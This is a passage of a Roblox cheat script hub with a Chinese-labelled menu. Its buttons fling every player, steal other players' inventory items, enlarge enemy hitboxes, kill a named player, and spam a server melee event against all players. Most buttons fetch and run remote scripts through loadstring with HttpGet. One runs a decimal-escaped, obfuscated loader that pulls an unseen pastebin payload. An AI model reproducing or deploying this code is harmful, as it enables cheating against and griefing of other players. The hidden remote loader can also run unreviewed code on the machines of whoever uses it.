            if InGame == true and Dead == false then
                plr.Character.HumanoidRootPart.CFrame = TargetList[index].Character.HumanoidRootPart.CFrame --tp to them
                
                TToggleFling() --enable fling
                
                for i = 0,2,1 do
                    plr.Character.HumanoidRootPart.CFrame = TargetList[index].Character.HumanoidRootPart.CFrame
                    wait(0.15)
                end
                
                TToggleFling() --disable fling
                
                wait(0.1) --wait until disabled
                
                if plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated then --check if seated
                    plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running) --get out if you are
                end
                
                index = index + 1 --go to next victim
                
                if Fling[4] == false then
                    break
                end
            else
                index = index + 1
            end
        end
    end
end

--[[events:]]--
CloseButton.MouseButton1Down:Connect(function()
    TitleBar:TweenPosition(UDim2.new(-0.3, 0, 0.7, 0), Enum.EasingDirection.In, Enum.EasingStyle.Back, 0.75)
	DisplayText("旋转甩飞关闭","汉化作者鹤")
	wait(0.8)
	ScreenGui.Enabled = false
	ScreenGui:Destroy()
	script:Destroy()
end)

SpeedUp.MouseButton1Down:Connect(function()
    Fling[3] = Fling[3] + 50
    SpeedBox.Text = "速度: "..Fling[3]
    
    if Fling[1] then
        BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
        BodyThrust.Location = Vector3.new(0, 0, Fling[3])
    end
end)

SpeedDown.MouseButton1Down:Connect(function()
    Fling[3] = Fling[3] - 50
    SpeedBox.Text = "速度: "..Fling[3]
    
    if Fling[1] then
        BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
        BodyThrust.Location = Vector3.new(0, 0, Fling[3])
    end
end)

SpeedBox.FocusLost:Connect(function()
    Fling[3] = SpeedBox.Text:gsub("%D",""):sub(0,5)
    if Fling[3] ~= nil then
        SpeedBox.Text = "速度: "..Fling[3]
        if Fling[1] then
            BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
            BodyThrust.Location = Vector3.new(0, 0, Fling[3])
        end
    end
    
end)

Hotkey.FocusLost:Connect(function()
    Fling[2] = Hotkey.Text:split(" ")[1]:sub(1,1)
    if Fling[2] ~= nil then
        Hotkey.Text = "数值: "..Fling[2]
    end
end)


ToggleFling.MouseButton1Down:Connect(function()
    TToggleFling()
end)

Respawn.MouseButton1Down:Connect(function()
        
    if Fling[1] then --disable fling if its enabled
        TToggleFling()
    end
    
    wait(0.4) --wait for fling to stop
    
    for i=0,10,1 do
        plr.Character.Humanoid:ChangeState(2) --make player recover from falling
    end
    
    for i, v in pairs(plr.Character:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Velocity, v.RotVelocity = Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)
        end
    end
end)

ToggleServerKill.MouseButton1Down:Connect(function()
    Fling[4] = not Fling[4]
    if Fling[4] then
        OpenObject(ToggleServerKill)
        DisplayText("开启全部甩飞","开启成功")
        ServerKek()
    else
        CloseObject(ToggleServerKill)
        DisplayText("关闭全部甩飞","全部甩飞已关闭")
    end
    
end)

NoVertGain.MouseButton1Down:Connect(function()
    Fling[5] = not Fling[5]
    if Fling[5] then
        OpenObject(NoVertGain)
    else
        CloseObject(NoVertGain)
    end
end)

RunService.Stepped:Connect(function()
    if Fling[1] then
        EnableNoClip()
    elseif Fling[5] then
        for i, v in pairs(plr.Character:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Velocity, v.RotVelocity = Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)
            end
        end
    end
end)

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        Dragging[1] = true
        Dragging[2] = input.Position
        Dragging[3] = TitleBar.Position
    end
end)

TitleBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        Dragging[1] = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        if Dragging[1] then
            local delta = input.Position - Dragging[2]
            TitleBar:TweenPosition(UDim2.new(Dragging[3].X.Scale, Dragging[3].X.Offset + delta.X, Dragging[3].Y.Scale, Dragging[3].Y.Offset + delta.Y), Enum.EasingDirection.Out, Enum.EasingStyle.Sine, 0.035)
            wait()
        end
    end
end)

mouse.KeyDown:Connect(function(key)
    if key == Fling[2] then
        TToggleFling()
    end
end)


DisplaySuggestion()
TitleBar:TweenPosition(UDim2.new(0.25, 0, 0.7, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.75)
return nil

  	end    

})

Tab:AddButton({

	Name = "走路甩人",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()

  	end    

})

Tab:AddButton({

	Name = "播放声音",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/beta/main/music.lua"))()

  	end    

})

Tab:AddButton({

	Name = "NA管理",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()

  	end    

})

Tab:AddButton({

	Name = "脸部放大（敌人）",

	Callback = function()

     _G.HeadSize = 8 
_G.Disabled = true
game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.Head.Transparency = 1
v.Character.Head.BrickColor = BrickColor.new("Red")
v.Character.Head.Material = "Neon"
v.Character.Head.CanCollide = false
v.Character.Head.Massless = true
end)
end
end
end
end)

  	end    

})

Tab:AddButton({

	Name = "最强功能（提供功能）",

	Callback = function()

     loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\110\102\104\107\81\98\80\78\34\41\41\40\41")()

  	end    

})

local Tab = Window:MakeTab({

    Name = "物品后台",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

Tab:AddButton({

	Name = "偷别人物品",

	Callback = function()

     --Copy And Paste:
for i,v in pairs (game.Players:GetChildren()) do
wait()
for i,b in pairs (v.Backpack:GetChildren()) do
b.Parent = game.Players.LocalPlayer.Backpack
end
end

  	end    

})

Tab:AddButton({

	Name = "传送工具",

	Callback = function()

     mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "[FE] TELEPORT TOOL" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack

  	end    

})

Tab:AddButton({

	Name = "建筑工具",

	Callback = function()

     loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()

  	end    

})

Tab:AddButton({

	Name = "隐身工具",

	Callback = function()

     loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))()

  	end    

})

Tab:AddButton({

	Name = "死亡笔记",

	Callback = function()

     --Made by Hirari_Tear, credits to expro for the GUI--

local Handle = Instance.new('Part')

local Mesh = Instance.new('SpecialMesh')

local Death = Instance.new('Tool')

Death.Name = "Death Note"

Handle.Name = "Handle"

Death.Parent = game.Players.LocalPlayer.Backpack

Death.GripForward = Vector3.new(0.331, -0.766, 0.551)

Death.GripPos = Vector3.new(-0.8, 0, -0.8)

Death.GripRight = Vector3.new(-0.943, -0.297, 0.152)

Death.GripUp = Vector3.new(-0.048, 0.57, 0.82)

Death.ToolTip = "Kill your fucking rival"

Handle.Parent = Death

Mesh.Parent = Handle

Mesh.MeshId = "http://www.roblox.com/asset/?id=1136139"

Mesh.TextureId = "http://www.roblox.com/asset/?id=18276952"

Mesh.Scale = Vector3.new(0.55, 0.174, 0.6)

Handle.Rotation = Vector3.new(0,-90,0)

Death.Equipped:connect(function(mouse)

local Bounce = Enum.EasingStyle.Bounce

local Quad = Enum.EasingStyle.Quad

local Normal = Enum.EasingStyle.Linear



local ScreenGui = Instance.new("ScreenGui", game.Players["LocalPlayer"].PlayerGui)

ScreenGui.Name = "Death Note"



local open = Instance.new("ImageButton", ScreenGui)

open.Position = UDim2.new(1, -110, 1, 500)

open.Size = UDim2.new(0, 100,0, 150)

open.Image = "rbxassetid://18536731"

open:TweenPosition(UDim2.new(1, -110, 1, -150), "In", Bounce, 0.8, true)



local Note = Instance.new("Frame", ScreenGui)

Note.Active = true

Note.Position = UDim2.new(1, -321, 1, 500)

Note.Size = UDim2.new(0, 320,0, 250)

Note.Visible = false

Note.Draggable = true



open.MouseButton1Down:connect(function()

open:TweenPosition(UDim2.new(open.Position.X.Scale,open.Position.X.Offset, 1, 500), "Out", Normal, 0.8, true)

wait(0.30)

open.Visible = false

Note.Visible = true

Note.Position = UDim2.new(1, -321, 1, 500)

Note:TweenPosition(UDim2.new(1, -321, 1, -251), "In", Normal, 0.5, true)

end)



local bg = Instance.new("Frame", Note)

bg.BackgroundColor3 = Color3.fromRGB(31, 31, 31)

bg.Size = UDim2.new(0, 160,0, 250)

bg.ZIndex = 2



-- Background



local close = Instance.new("TextButton", bg)

close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

close.BackgroundTransparency = 1

close.Position = UDim2.new(0, 8,0, 10)

close.Size = UDim2.new(0, 10,0, 10)

close.ZIndex = 4

close.Font = "Cartoon"

close.Text = "X"

close.TextColor3 = Color3.fromRGB(255, 255, 255)

close.TextSize = "17"



close.MouseButton1Down:connect(function()

Note:TweenPosition(UDim2.new(Note.Position.X.Scale,Note.Position.X.Offset,1, 500), "Out", Normal, 0.5, true)

wait(0.30)

Note.Visible = false

open.Visible = true

open:TweenPosition(UDim2.new(1, -110, 1, -150), "In", Normal, 0.8, true)

end)



local image1 = Instance.new("ImageLabel", bg)

image1.BackgroundTransparency = 1

image1.Size = UDim2.new(1, 0,1, 0)

image1.ZIndex = 3

image1.Image = "rbxassetid://18528551"



local title = Instance.new("TextLabel", bg)

title.BackgroundTransparency = 1

title.Position = UDim2.new(0, 0,0, 30)

title.Size = UDim2.new(1, 0,0, 30)

title.ZIndex = 4

title.Font = "Bodoni"

title.Text = "DEATH NOTE"

title.TextColor3 = Color3.fromRGB(255, 255, 255)

title.TextSize = "18"



local body = Instance.new("TextLabel", bg)

body.BackgroundTransparency = 1

body.Position = UDim2.new(0, 15,0, 65)

body.Size = UDim2.new(0, 134,0, 40)

body.ZIndex = 4

body.Font = "Garamond"

body.Text = "Type in somebody's name to kill them."

body.TextColor3 = Color3.fromRGB(255, 255, 255)

body.TextSize = "19"

body.TextWrapped = true

body.TextXAlignment = "Left"

body.TextYAlignment = "Top"



local line = Instance.new("TextLabel", body)

line.BackgroundTransparency = 1

line.Position = UDim2.new(0, 0,0, 50)

line.Size = UDim2.new(0, 130,0, 40)

line.ZIndex = 4

line.Font = "Garamond"

line.Text = "________________"

line.TextColor3 = Color3.fromRGB(255, 255, 255)

line.TextSize = "19"

line.TextWrapped = true

line.TextXAlignment = "Left"

line.TextYAlignment = "Top"



local text = Instance.new("TextLabel", body)

text.BackgroundTransparency = 1

text.Position = UDim2.new(0, 0,0, 100)

text.Size = UDim2.new(0, 134,0, 40)

text.ZIndex = 4

text.Font = "Garamond"

text.Text = "This was made by RcDZ."

text.TextColor3 = Color3.fromRGB(255, 255, 255)

text.TextSize = "19"

text.TextWrapped = true

text.TextXAlignment = "Left"

text.TextYAlignment = "Top"



-- Page



local page = Instance.new("Frame", Note)

page.BackgroundColor3 = Color3.fromRGB(236, 236, 236)

page.Position = UDim2.new(0, 160,0, 0)

page.Size = UDim2.new(0, 160,0, 250)

page.ZIndex = 2



local list = Instance.new("TextBox", page)

list.BackgroundTransparency = 1

list.Position = UDim2.new(0, 25,0, 20)

list.Size = UDim2.new(0.8, 5,0, 230)

list.ZIndex = 4

list.Font = "Antique"

list.Text = ""

list.TextColor3 = Color3.fromRGB(0, 0, 0)

list.TextSize = "23"

list.TextWrapped = true

list.TextXAlignment = "Left"

list.TextYAlignment = "Top"



local image2 = Instance.new("ImageLabel", page)

image2.BackgroundTransparency = 1

image2.Size = UDim2.new(1, 0,1, 0)

image2.ZIndex = 3

image2.Image = "rbxassetid://170279713"

image2.Transparency = 0.2



while true do

repeat wait() until game.Workspace:FindFirstChild(list.Text)

if game.Workspace[list.Text]:FindFirstChild("Humanoid") then

game.Workspace[list.Text].Humanoid.PlatformStand = true

game.Workspace[list.Text].Humanoid.Health = 0

elseif game.Workspace[list.Text]:FindFirstChild("Zombie") then

game.Workspace[list.Text].Zombie.PlatformStand = true

game.Workspace[list.Text].Zombie.Health = 0

end

end

end)

Death.Unequipped:connect(function(mouse)

game.Players.LocalPlayer.PlayerGui["Death Note"]:remove()

end)
--12333

  	end    

})

Tab:AddButton({

	Name = "分头行动",

	Callback = function()

     --made by Nightmare#0930
local lp = game.Players.LocalPlayer
local char = lp.Character

for i, v in pairs(char:GetChildren()) do
    if v:IsA("BallSocketConstraint") then
        v:Destroy()
    end
end

for i, v in pairs(char:GetChildren()) do
    if v:IsA("HingeConstraint") then
        v:Destroy()
    end
end

for i, v in pairs(char.Humanoid:GetAccessories()) do
local hat = v.Name

char[hat].Archivable = true
local fake = char[hat]:Clone()
fake.Parent = char
fake.Handle.Transparency = 1

local hold = false
local enabled = false

char[hat].Handle.AccessoryWeld:Destroy()

local tool = Instance.new("Tool", lp.Backpack)
tool.RequiresHandle = true
tool.CanBeDropped = false
tool.Name = hat

local handle = Instance.new("Part", tool)
handle.Name = "Handle"
handle.Size = Vector3.new(1, 1, 1)
handle.Massless = true
handle.Transparency = 1

local positions = {
    forward = tool.GripForward,
    pos = tool.GripPos,
    right = tool.GripRight,
    up = tool.GripUp
}

tool.Equipped:connect(function()
 hold = true
end)

tool.Unequipped:connect(function()
   hold = false
end)

tool.Activated:connect(function()
    if enabled == false then
        enabled = true
        tool.GripForward = Vector3.new(-0.976,0,-0.217)
    tool.GripPos = Vector3.new(.95,-0.76,1.4)
    tool.GripRight = Vector3.new(0.217,0, 0.976)
    tool.GripUp = Vector3.new(0,1,0)
    wait(.8)
    tool.GripForward = positions.forward
    tool.GripPos = positions.pos
    tool.GripRight = positions.right
    tool.GripUp = positions.up
    enabled = false
    end
end)

game:GetService("RunService").Heartbeat:connect(function()
    pcall(function()
       char[hat].Handle.Velocity = Vector3.new(30, 0, 0)
if hold == false then
    char[hat].Handle.CFrame = fake.Handle.CFrame
elseif hold == true then
    char[hat].Handle.CFrame = handle.CFrame
    end
end)
end)
end

  	end    

})

Tab:AddButton({

	Name = "小刀（没用）",

	Callback = function()

     --e = Kill 
--q = Fix Knife


me = game.Players.LocalPlayer
char = me.Character
selected = false
attacking = false
hurt = false
grabbed = nil
mode = "kill"
bloodcolors = {"Bright red", "Really red", "Crimson"}
enabled = true
enabled2 = true

local breaksound = Instance.new("Sound")
breaksound.SoundId = "http://www.roblox.com/asset/?id=2801263"
breaksound.Parent = game.Workspace
breaksound.Volume = 0.8
	
local killsound = Instance.new("Sound")
killsound.SoundId = "http://www.roblox.com/asset?id=16950449"
killsound.Pitch = 0.65
killsound.Parent = game.Workspace

local drainsound = Instance.new("Sound")
drainsound.SoundId = "http://www.roblox.com/asset/?id=2785493"
drainsound.Pitch = 0.7


function prop(part, parent, collide, tran, ref, x, y, z, color, anchor, form)
part.Parent = parent
part.formFactor = form
part.CanCollide = collide
part.Transparency = tran
part.Reflectance = ref
part.Size = Vector3.new(x,y,z)
part.BrickColor = BrickColor.new(color)
part.TopSurface = 0
part.BottomSurface = 0
part.Anchored = anchor
part.Locked = true
part:BreakJoints()
end

function weld(w, p, p1, a, b, c, x, y, z)
w.Parent = p
w.Part0 = p
w.Part1 = p1
w.C1 = CFrame.fromEulerAnglesXYZ(a,b,c) * CFrame.new(x,y,z)
end

function mesh(mesh, parent, x, y, z, type)
mesh.Parent = parent
mesh.Scale = Vector3.new(x, y, z)
mesh.MeshType = type
end

function remgui()
	for _,v in pairs(me.PlayerGui:GetChildren()) do
		if v.Name == "Modeshow" then
			v:remove()
		end
	end
end

function inform(text,delay)
	remgui()
	local sc = Instance.new("ScreenGui")
	sc.Parent = me.PlayerGui
	sc.Name = "Modeshow"
	local bak = Instance.new("Frame",sc)
	bak.BackgroundColor3 = Color3.new(1,1,1)
	bak.Size = UDim2.new(0.94,0,0.1,0)
	bak.Position = UDim2.new(0.03,0,0.037,0)
	bak.BorderSizePixel = 0
	local gi = Instance.new("TextLabel",sc)
	gi.Size = UDim2.new(0.92,0,0.09,0)
	gi.BackgroundColor3 = Color3.new(0,0,0)
	gi.Position = UDim2.new(0.04,0,0.042,0)
	gi.TextColor3 = Color3.new(1,1,1)
	gi.FontSize = "Size14"
	gi.Text = text
	coroutine.resume(coroutine.create(function()
		wait(delay)
		sc:remove()
	end))
end

if char:findFirstChild("Bricks",true) then
	char:findFirstChild("Bricks",true):remove()
end

bricks = Instance.new("Model",me.Character)
bricks.Name = "Bricks"

--Parts-------------------------Parts-------------------------Parts-------------------------Parts----------------------

rarm = char:findFirstChild("Right Arm")
larm = char:findFirstChild("Left Arm")
lleg = char:findFirstChild("Left Leg")
torso = char:findFirstChild("Torso")
hum = char:findFirstChild("Humanoid")
rleg = char:findFirstChild("Right Leg")

righthold = Instance.new("Part")
prop(righthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Mid gray", false, "Custom")
w11 = Instance.new("Weld")
weld(w11, rarm, righthold, 0, 0, 0, 0, 1, 0)

lefthold = Instance.new("Part")
prop(lefthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Mid gray", false, "Custom")
w12 = Instance.new("Weld")
weld(w12, larm, lefthold, 0, 0, 0, 0, 1, 0)

hold = Instance.new("Part")
prop(hold, bricks, false, 0, 0, 0.2, 0.3, 0.3, "Black", false, "Custom")
oh = Instance.new("Weld")
weld(oh, torso, hold, -math.pi/-0.86, 1.5, math.rad(0), -0.35, -0.4, -0.5)

knife = Instance.new("Part")
knife.Material = "Wood"
prop(knife, bricks, false, 0, 0, 0.25, 1.1, 0.3, "Pine Cone", false, "Custom")
orr = Instance.new("Weld")
weld(orr, hold, knife, 0, 0, 0, 0, 0.7, 0)
ar = Instance.new("Weld")
weld(ar, lefthold, nil, math.pi/2, 0, math.pi, 0, 0, 0)

blade = Instance.new("Part")
blade.Material = "Neon"
prop(blade, bricks, false, 0, 0, 0.1, 2.5, 0.25, "Mid gray", false, "Custom")
Instance.new("BlockMesh",blade).Scale = Vector3.new(0.3,1,1)
w2 = Instance.new("Weld")
weld(w2, knife, blade, 0, 0, 0, 0, -0.65, 0)

blade2 = Instance.new("Part")
blade2.Material = "Neon"
prop(blade2, bricks, false, 0, 0, 0.1, 0.4, 0.25, "Mid gray", false, "Custom")
local mew = Instance.new("SpecialMesh",blade2)
mew.MeshType = "Wedge"
mew.Scale = Vector3.new(0.3,1,1)
w3 = Instance.new("Weld")
weld(w3, blade, blade2, 0, 0, 0, 0, -1.45, 0)


rb = Instance.new("Part")
prop(rb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Bright red", false, "Custom")
w13 = Instance.new("Weld")
weld(w13, torso, rb, 0, 0, 0, -1.5, -0.5, 0)

lb = Instance.new("Part")
prop(lb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Bright red", false, "Custom")
w14 = Instance.new("Weld")
weld(w14, torso, lb, 0, 0, 0, 1.5, -0.5, 0)

rw = Instance.new("Weld")
weld(rw, rb, nil, 0, 0, 0, 0, 0.5, 0)

lw = Instance.new("Weld")
weld(lw, lb, nil, 0, 0, 0, 0, 0.5, 0)

grabweld = nil
platlol = nil
lolhum = nil

function touch(h)
	if hurt then
		if grabbed == nil then
			local hu = h.Parent:findFirstChild("Humanoid")
			local head = h.Parent:findFirstChild("Head")
			local torz = h.Parent:findFirstChild("Torso")
			if hu ~= nil and head ~= nil and torz ~= nil and h.Parent.Name ~= name then
				if hu.Health > 0 then
				grabbed = torz
				hu.PlatformStand = true
				local w = Instance.new("Weld")
				weld(w,righthold,grabbed,math.pi/2,0.2,0,0.7,-0.9,-0.6)
				grabweld = w
				lolhum = hu
				local lolxd = true
				platlol = lolxd
				hu.Changed:connect(function(prop)
					if prop == "PlatformStand" and platlol then
						hu.PlatformStand = true
					end
				end)
				end
			end
		end
	end
end

righthold.Touched:connect(touch)
lefthold.Touched:connect(touch)

function bleed(part,po)
	local lol1 = math.random(5,30)/100
	local lol2 = math.random(5,30)/100
	local lol3 = math.random(5,30)/100
	local lol4 = math.random(1,#bloodcolors)
	local p = Instance.new("Part")
	prop(p,part.Parent,false,0,0,lol1,lol2,lol3,bloodcolors[lol4],false,"Custom")
	p.CFrame = part.CFrame * CFrame.new(math.random(-5,5)/10,po,math.random(-5,5)/10)
	p.Velocity = Vector3.new(math.random(-25,25),math.random(-25,25),math.random(-25,25))
	p.RotVelocity = Vector3.new(math.random(-400,400)/10,math.random(-400,400)/10,math.random(-400,400)/10)
	p.CanCollide = true
	coroutine.resume(coroutine.create(function()
		wait(3)
		p:remove()
	end))
end

h = Instance.new("HopperBin",me.Backpack)

h.Name = "Knife"

script.Parent = h


bin = h



function select(mouse)
	orr.Part1 = nil
	ar.Part1 = knife
	mouse.Button1Down:connect(function()
		if attacking == false then
			attacking = true
			lw.Part1 = larm
			rw.Part1 = rarm
			hurt = true
			for i=1, 8 do
				rw.C0 = rw.C0 * CFrame.new(-0.03,0,-0.08) * CFrame.fromEulerAnglesXYZ(0.18,0.04,0)
				lw.C0 = lw.C0 * CFrame.new(0.06,0,-0.06) * CFrame.fromEulerAnglesXYZ(0.15,-0.11,-0.05)
				wait()
			end
			wait(1)
			hurt = false
			if grabbed == nil then
				for i=1, 4 do
					rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
					lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
					wait()
				end
				lw.C0 = CFrame.new(0,0,0)
				rw.C0 = CFrame.new(0,0,0)
				lw.Part1 = nil
				rw.Part1 = nil
				attacking = false
			end
		elseif hurt == false and grabbed ~= nil and mode == "drop" then
			enabled2 = true
			grabweld:remove()
			grabweld = nil
			platlol = false
			grabbed = nil
			lolhum.PlatformStand = false
			lolhum = nil
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			attacking = false
			platlol = nil
			
		elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "kill" and enabled2 == true then
			enabled2 = false
			enabled = false
			
			breaksound.Parent = grabbed
			breaksound:Play()
			
			for i=1, 5 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.15,-0.02) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				wait()
			end
			local duh = grabbed
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)				
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			wait(0.12)
			for i=1, 5 do
				lw.C0 = lw.C0 * CFrame.new(-0.02,-0.15,0.02) * CFrame.fromEulerAnglesXYZ(0.05,-0,0.03)
				wait()
			end
			
			
			if grabbed.Parent:findFirstChild("HumanoidRootPart",true) then
                        for i, plr in pairs(game.Players:GetChildren()) do
                        if plr.Name ~= game.Players.LocalPlayer.Name then
                        for i = 1, 10 do
                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                        end
                 end
          end
			end
			grabbed.Parent.Humanoid.Health = grabbed.Parent.Humanoid.Health / 1.5
			
		elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "drain" and enabled == true then
				enabled = false
				enabled2 = true
				
				for i=1, 2 do
					lw.C0 = lw.C0 * CFrame.new(0.06,0,-0.06) * CFrame.fromEulerAnglesXYZ(0.15,-0.11,-0.05)
					wait()
				end	

				while char.Humanoid.Health == char.Humanoid.MaxHealth do
					bleed(grabbed, 1)
					char.Humanoid.Health = char.Humanoid.Health + 1
					grabbed.Parent.Humanoid.Health = grabbed.Parent.Humanoid.Health - 1
					wait(0.0335)
				end
				
				for i=1, 1 do
					lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
					wait()
				end
				enabled = true
				
				
		elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "throw" then
			enabled2 = true
			grabweld:remove()
			grabweld = nil
			local bf = Instance.new("BodyForce",grabbed)
			bf.force = torso.CFrame.lookVector * 4000
			bf.force = bf.force + Vector3.new(0,1500,0)
			coroutine.resume(coroutine.create(function()
				wait(0.12)
				bf:remove()
			end))
			for i=1, 6 do
				rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.35,0,0)
				lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.18,0,0)
				wait()
			end
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.47,0,0)
				lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.2,0,0)
				wait()
			end
			wait(0.2)
			platlol = false
			grabbed = nil
			lolhum.PlatformStand = false
			lolhum = nil
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			attacking = false
			platlol = nil
		elseif hurt == false and grabbed ~= nil and lolhum ~= nil and grabweld ~= nil and mode == "para" then
			enabled2 = true
			killsound.Parent = grabbed
			killsound:Play()
			for i=1, 5 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				wait()
			end
			local ne = grabbed:findFirstChild("Neck")
			coroutine.resume(coroutine.create(function()
				local duh = grabbed
				local duh2 = grabbed.Parent.Head
				local lolas = lolhum
				duh.RotVelocity = Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
				for i=1, 75 do
					wait()
					local hm = math.random(1,15)
					pcall(function()
						if hm == 1 then
							duh2.Sound.Pitch = math.random(90,110)/100
							duh2.Sound:play()
							script.Parent.Splat:Play();
						end
					end)

					if hm > 0 and hm < 4 then

						bleed(duh,1)
						bleed(duh2,-0.1)
						bleed(duh,1)
						bleed(duh2,-0.1)
						bleed(duh,1)
						bleed(duh,1)
						bleed(duh,1)										
					end
				end
				wait(1.2)
				
				lolas.Health = 0
				for i=1, 85 do
					wait()
					local hm = math.random(1,9)
					pcall(function()
						if hm == 1 then
							duh2.Sound.Pitch = math.random(90,110)/100
							duh2.Sound:play()
						end
					end)
					if hm > 0 and hm < 3 then
						bleed(duh,1)
						bleed(duh2,-0.5)
					end
				end
			end))
			for i=1, 3 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				if ne ~= nil then
					grabbed.Neck.C0 = grabbed.Neck.C0 * CFrame.fromEulerAnglesXYZ(-0.35,0,0)
				end
				wait()
			end
			grabweld:remove()
			grabweld = nil
			for i=1, 4 do
				lw.C0 = lw.C0 * CFrame.new(-0.04,-0.24,-0.2) * CFrame.fromEulerAnglesXYZ(0.1,0,0.06)
				wait()
			end
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			platlol = false
			grabbed = nil
			lolhum = nil
			attacking = false
			platlol = nil
		end
	end)
	mouse.KeyDown:connect(function(kai)
		key = kai:lower()
		if key == "q" then
			mode = "drop"
			inform("Fix Knife",1)
		elseif key == "e" then
			mode = "kill"
			inform("Kill",1)
		end
	end)
end

function desel()
	repeat wait() until attacking == false
	orr.Part1 = knife
	ar.Part1 = nil
end

bin.Selected:connect(select)
bin.Deselected:connect(desel)

char.Humanoid.Died:connect(function()
	pcall(function()
		grabweld:remove()
		grabweld = nil
		grabbed = nil
		platlol = false
		platlol = nil
	end)
end)

inform("Prison Life v2.0.2 Grab Knife Loaded | e = Kill /\ q = Fix Knife",3)
wait(3.2)
inform("Made By ASADCATONVERM :D", 2)

  	end    

})

Tab:AddButton({

	Name = "手里剑（部分游戏可攻击）",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/mSLiAZHk"))()

  	end    

})

Tab:AddButton({

	Name = "装备隐身",

	Callback = function()

     local offset = 1100
